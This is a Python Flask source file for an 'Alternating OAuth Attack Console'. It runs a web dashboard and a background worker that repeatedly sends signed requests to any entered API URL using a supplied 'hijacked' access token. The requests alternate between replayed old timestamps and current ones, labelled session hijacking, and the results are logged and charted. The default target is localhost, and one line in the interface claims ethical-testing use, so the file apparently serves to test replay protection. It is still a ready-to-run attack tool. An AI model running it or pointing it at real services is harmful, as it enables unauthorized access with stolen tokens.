from flask import Flask, request, jsonify, render_template_string, send_file
import threading
import time
from datetime import datetime, timedelta
import hmac
import hashlib
import requests
import json
import random
from collections import deque
import os
from io import BytesIO
import webbrowser

app = Flask(__name__)

# =============================
# Global state
# =============================
attack_thread = None
attack_running = False
stop_event = threading.Event()
lock = threading.Lock()

recent_logs = deque(maxlen=500)   # for UI table
timeseries = []                   # for chart

cfg_stats = {
    "api_url": "http://localhost:5000/protected_api",
    "token": "",
    "secret_key": "super_secret_key",
    "interval_sec": 2.0,
    "duration_min": 30,
    "start_time": None,
    "end_time": None,
    "total": 0,
    "success": 0,
    "fail": 0,
    "jsonl_file": "",
}

# =============================
# Helpers
# =============================
def generate_signature(secret_key_bytes: bytes, token: str, ts: str):
    message = f"{token}:{ts}"
    t0 = time.perf_counter()
    sig = hmac.new(secret_key_bytes, message.encode(), hashlib.sha256).hexdigest()
    t1 = time.perf_counter()
    signing_ms = round((t1 - t0) * 1000, 4)
    return sig, signing_ms

def add_timeseries_point():
    with lock:
        timeseries.append({
            "ts": datetime.now().isoformat(),
            "success": cfg_stats["success"],
            "fail": cfg_stats["fail"],
            "total": cfg_stats["total"],
        })
        if len(timeseries) > 3600:  # ~1 hour at 1 Hz
            del timeseries[:len(timeseries) - 3600]

def append_jsonl(obj):
    try:
        with open(cfg_stats["jsonl_file"], "a", encoding="utf-8") as f:
            f.write(json.dumps(obj, ensure_ascii=False) + "\n")
    except Exception:
        pass

def ui_log_row(row):
    with lock:
        recent_logs.append(row)

# =============================
# Worker
# =============================
def attack_worker():
    attempt = 0
    while not stop_event.is_set():
        with lock:
            if not attack_running:
                break
            now = datetime.now()
            if now >= cfg_stats["end_time"]:
                break
            api_url = cfg_stats["api_url"]
            token = cfg_stats["token"]
            secret = cfg_stats["secret_key"]
            interval = float(cfg_stats["interval_sec"])

        attempt += 1

        # Alternate attack types: odd=replay (old timestamp), even=session hijacking (current)
        if attempt % 2 == 1:
            attack_type = "Replay Attack"
            ts = str(int(time.time()) - 600)  # 10 minutes old
        else:
            attack_type = "Session Hijacking"
            ts = str(int(time.time()))

        attacker_id = f"attacker_{random.randint(1000,9999)}"
        signature, signing_ms = generate_signature(secret.encode(), token, ts)

        headers = {
            "Authorization": f"Bearer {token}",
            "X-Timestamp": ts,
            "X-Signature": signature,
            "Content-Type": "application/json"
        }

        # Send request
        try:
            t0 = time.perf_counter()
            resp = requests.get(api_url, headers=headers, timeout=20)
            t1 = time.perf_counter()
            resp_ms = round(t1 - t0, 4)
            status = resp.status_code
            body_text = (resp.text or "").strip()
        except Exception as ex:
            resp_ms = 0.0
            status = "ERR"
            body_text = f"EXCEPTION: {ex}"

        result = "SUCCESS" if status == 200 else "FAIL"

        with lock:
            cfg_stats["total"] += 1
            if result == "SUCCESS":
                cfg_stats["success"] += 1
            else:
                cfg_stats["fail"] += 1

        row = {
            "attempt": attempt,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attacker_id": attacker_id,
            "attack_type": attack_type,
            "access_token_preview": (token[:40] + "...") if len(token) > 40 else token,
            "signature": signature,
            "signature_size_bytes": len(signature.encode()),
            "signing_time_ms": signing_ms,
            "request_timestamp": ts,
            "response_time_sec": resp_ms,
            "status_code": status,
            "result": result,
            "response_text": body_text[:4000]
        }

        # Console print (useful if running as .exe too)
        print(f"[{row['timestamp']}] Attempt #{attempt} | {attacker_id} | {attack_type} | "
              f"Status: {status} | Signing: {signing_ms} ms | Resp: {resp_ms}s")

        append_jsonl(row)
        ui_log_row(row)
        add_timeseries_point()

        time.sleep(interval)

    with lock:
        # graceful stop
        pass

# =============================
# UI (inline template)
# =============================
PAGE = r"""
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Alternating OAuth Attack Console</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
</head>
<body class="bg-slate-950 text-slate-100">
  <div class="max-w-6xl mx-auto p-6">
    <header class="flex items-center justify-between mb-6">
      <h1 class="text-2xl font-bold">Alternating OAuth Attack Console</h1>
      <div class="flex gap-2">
        <a href="/attack/download" class="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 transition text-sm">Download JSONL</a>
      </div>
    </header>

    <!-- Controls -->
    <section class="rounded-2xl bg-slate-900 border border-slate-800 p-4 mb-6">
      <h2 class="font-semibold mb-4">Parameters</h2>
      <form class="grid md:grid-cols-3 gap-4">
        <div class="md:col-span-3">
          <label class="block text-sm mb-1">API URL</label>
          <input id="apiUrl" type="text" class="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700"
                 value="http://localhost:5000/protected_api" />
        </div>
        <div class="md:col-span-3">
          <label class="block text-sm mb-1">Hijacked Access Token</label>
          <input id="token" type="text" class="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700"
                 placeholder="Bearer token string..." />
        </div>
        <div class="md:col-span-3">
          <label class="block text-sm mb-1">HMAC Secret Key</label>
          <input id="secret" type="text" class="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700"
                 value="super_secret_key" />
        </div>
        <div>
          <label class="block text-sm mb-1">Duration (minutes)</label>
          <input id="duration" type="number" min="1" max="480" value="30"
                 class="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700" />
        </div>
        <div>
          <label class="block text-sm mb-1">Interval (seconds)</label>
          <input id="interval" type="number" min="0.1" step="0.1" value="2"
                 class="w-full px-3 py-2 rounded-xl bg-slate-800 border border-slate-700" />
        </div>
        <div class="md:col-span-3 flex gap-3">
          <button id="btnStart" type="button"
                  class="px-4 py-2 rounded-2xl bg-indigo-600 hover:bg-indigo-500 transition">Start</button>
          <button id="btnStop" type="button"
                  class="px-4 py-2 rounded-2xl bg-rose-600 hover:bg-rose-500 transition">Stop</button>
        </div>
        <p class="md:col-span-3 text-xs text-slate-400">For ethical testing on your own systems only.</p>
      </form>
    </section>

    <!-- Status -->
    <section class="rounded-2xl bg-slate-900 border border-slate-800 p-4 mb-6">
      <h2 class="font-semibold mb-4">Live Status</h2>
      <div class="grid md:grid-cols-5 gap-4">
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Running</div><div id="stRunning" class="text-lg">—</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Success</div><div id="stSuccess" class="text-lg">0</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Fail</div><div id="stFail" class="text-lg">0</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Total</div><div id="stTotal" class="text-lg">0</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Log File</div><div id="stFile" class="text-xs truncate">—</div></div>
      </div>
      <div class="grid md:grid-cols-3 gap-4 mt-4">
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Target</div><div id="stTarget" class="text-sm truncate">—</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Window</div><div id="stWindow" class="text-sm">—</div></div>
        <div class="rounded-xl bg-slate-800/60 p-3"><div class="text-xs text-slate-400 mb-1">Interval</div><div id="stInterval" class="text-sm">—</div></div>
      </div>
    </section>

    <!-- Chart -->
    <section class="rounded-2xl bg-slate-900 border border-slate-800 p-4 mb-6">
      <h2 class="font-semibold mb-4">Success vs Fail Over Time</h2>
      <canvas id="sfChart" height="120"></canvas>
    </section>

    <!-- Log -->
    <section class="rounded-2xl bg-slate-900 border border-slate-800 p-4">
      <div class="flex items-center justify-between mb-3">
        <h2 class="font-semibold">Recent Attempts</h2>
        <button id="btnClear" class="px-3 py-2 rounded-2xl bg-slate-800 hover:bg-slate-700 transition">Clear Table</button>
      </div>
      <div class="overflow-auto">
        <table class="w-full text-left text-sm">
          <thead class="text-slate-300 border-b border-slate-800">
            <tr>
              <th class="py-2 pr-4">Time</th>
              <th class="py-2 pr-4">Type</th>
              <th class="py-2 pr-4">Status</th>
              <th class="py-2 pr-4">Sign (ms)</th>
              <th class="py-2 pr-4">Resp (s)</th>
              <th class="py-2 pr-4">Result</th>
              <th class="py-2 pr-4">Body</th>
            </tr>
          </thead>
          <tbody id="logTable"></tbody>
        </table>
      </div>
    </section>
  </div>

  <script>
    const $ = (id) => document.getElementById(id);

    async function startAttack() {
      const payload = {
        api_url: $("apiUrl").value.trim(),
        token: $("token").value.trim(),
        secret_key: $("secret").value.trim(),
        duration_minutes: Number($("duration").value),
        interval_seconds: Number($("interval").value),
      };
      const res = await fetch("/attack/start", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
      const data = await res.json();
      alert(data.message || "Started");
    }

    async function stopAttack() {
      const res = await fetch("/attack/stop", { method: "POST" });
      const data = await res.json();
      alert(data.message || "Stopped");
    }

    function renderStatus(s) {
      $("stRunning").textContent = s.running ? "Yes" : "No";
      $("stSuccess").textContent = s.success;
      $("stFail").textContent = s.fail;
      $("stTotal").textContent = s.total;
      $("stFile").textContent = s.jsonl_file || "—";
      $("stTarget").textContent = s.api_url || "—";
      $("stWindow").textContent = s.window || "—";
      $("stInterval").textContent = s.interval || "—";
    }

    function renderLogs(logs) {
      const tbody = $("logTable");
      tbody.innerHTML = "";
      for (const r of logs) {
        const tr = document.createElement("tr");
        tr.className = "border-b border-slate-800/70 align-top";
        tr.innerHTML = `
          <td class="py-2 pr-4 whitespace-nowrap">${r.timestamp}</td>
          <td class="py-2 pr-4">${r.attack_type}</td>
          <td class="py-2 pr-4">${r.status_code}</td>
          <td class="py-2 pr-4">${r.signing_time_ms}</td>
          <td class="py-2 pr-4">${r.response_time_sec}</td>
          <td class="py-2 pr-4 ${r.result === "SUCCESS" ? "text-emerald-400" : "text-rose-400"}">${r.result}</td>
          <td class="py-2 pr-4 text-slate-300 max-w-xl break-words">${r.response_text}</td>
        `;
        tbody.prepend(tr);
      }
    }

    // Chart
    const ctx = document.getElementById('sfChart');
    const sfChart = new Chart(ctx, {
      type: 'line',
      data: { labels: [], datasets: [
        { label: 'Success', data: [], tension: 0.25 },
        { label: 'Fail', data: [], tension: 0.25 },
        { label: 'Total', data: [], tension: 0.25 },
      ]},
      options: {
        responsive: true,
        plugins: { legend: { labels: { color: '#cbd5e1' } } },
        scales: {
          x: { ticks: { color: '#94a3b8' }, grid: { color: '#1f2937' } },
          y: { ticks: { color: '#94a3b8' }, grid: { color: '#1f2937' } },
        }
      }
    });

    function renderSeries(series) {
      const labels = series.map(p => new Date(p.ts).toLocaleTimeString());
      sfChart.data.labels = labels;
      sfChart.data.datasets[0].data = series.map(p => p.success);
      sfChart.data.datasets[1].data = series.map(p => p.fail);
      sfChart.data.datasets[2].data = series.map(p => p.total);
      sfChart.update();
    }

    async function poll() {
      try {
        const res = await fetch("/attack/status");
        const data = await res.json();
        renderStatus(data.status);
        renderLogs(data.logs || []);
        const s2 = await (await fetch("/attack/timeseries")).json();
        renderSeries(s2.series || []);
      } catch (e) {}
      setTimeout(poll, 1000);
    }

    $("btnStart").addEventListener("click", startAttack);
    $("btnStop").addEventListener("click", stopAttack);
    $("btnClear").addEventListener("click", () => { $("logTable").innerHTML = ""; });

    poll();
  </script>
</body>
</html>
"""

# =============================
# Routes
# =============================
@app.get("/attack")
def ui():
    return render_template_string(PAGE)

@app.post("/attack/start")
def start_attack():
    global attack_thread, attack_running
    data = request.get_json(force=True, silent=True) or {}
    api_url = (data.get("api_url") or "").strip()
    token = (data.get("token") or "").strip()
    secret_key = (data.get("secret_key") or "").strip()
    duration_minutes = max(1, int(data.get("duration_minutes") or 30))
    interval_seconds = max(0.1, float(data.get("interval_seconds") or 2.0))

    if not api_url or not token or not secret_key:
        return jsonify({"ok": False, "message": "API URL, Token, and Secret Key are required."}), 400

    with lock:
        if attack_running:
            return jsonify({"ok": False, "message": "Attack already running."}), 400

        cfg_stats["api_url"] = api_url
        cfg_stats["token"] = token
        cfg_stats["secret_key"] = secret_key
        cfg_stats["interval_sec"] = interval_seconds
        cfg_stats["duration_min"] = duration_minutes
        cfg_stats["start_time"] = datetime.now()
        cfg_stats["end_time"] = cfg_stats["start_time"] + timedelta(minutes=duration_minutes)
        cfg_stats["total"] = 0
        cfg_stats["success"] = 0
        cfg_stats["fail"] = 0
        cfg_stats["jsonl_file"] = f"oauth2_attack_log_{cfg_stats['start_time'].strftime('%Y%m%d_%H%M%S')}.jsonl"
        recent_logs.clear()
        timeseries.clear()
        stop_event.clear()
        attack_running = True

    attack_thread = threading.Thread(target=attack_worker, daemon=True)
    attack_thread.start()

    win = f"{cfg_stats['start_time'].strftime('%H:%M:%S')} → {cfg_stats['end_time'].strftime('%H:%M:%S')}"
    return jsonify({"ok": True, "message": f"Attack started. Window: {win}", "file": cfg_stats["jsonl_file"]})

@app.post("/attack/stop")
def stop_attack():
    global attack_running
    with lock:
        attack_running = False
        stop_event.set()
    try:
        if attack_thread:
            attack_thread.join(timeout=2.0)
    except Exception:
        pass
    return jsonify({"ok": True, "message": "Attack stopped."})

@app.get("/attack/status")
def status():
    with lock:
        st = {
            "running": attack_running,
            "success": cfg_stats["success"],
            "fail": cfg_stats["fail"],
            "total": cfg_stats["total"],
            "api_url": cfg_stats["api_url"],
            "jsonl_file": cfg_stats["jsonl_file"],
            "interval": f"{cfg_stats['interval_sec']}s",
        }
        if cfg_stats["start_time"] and cfg_stats["end_time"]:
            st["window"] = f"{cfg_stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')} → {cfg_stats['end_time'].strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            st["window"] = "—"
        logs = list(recent_logs)
    return jsonify({"ok": True, "status": st, "logs": logs})

@app.get("/attack/timeseries")
def get_series():
    with lock:
        series = list(timeseries)
    return jsonify({"ok": True, "series": series})

@app.get("/attack/download")
def download_jsonl():
    with lock:
        path = cfg_stats["jsonl_file"]
    if not path or not os.path.exists(path):
        mem = BytesIO()
        mem.write(b"")  # empty jsonl
        mem.seek(0)
        return send_file(mem, mimetype="application/json", as_attachment=True, download_name="oauth2_attack_log.jsonl")
    return send_file(path, mimetype="application/json", as_attachment=True, download_name=os.path.basename(path))

# =============================
# Auto-open + run (exe-friendly)
# =============================
if __name__ == "__main__":
    url = "http://127.0.0.1:5002/attack"
    print(f"🚀 Opening dashboard: {url}")
    try:
        webbrowser.open(url)
    except Exception:
        pass
    app.run(host="127.0.0.1", port=5002, debug=False)
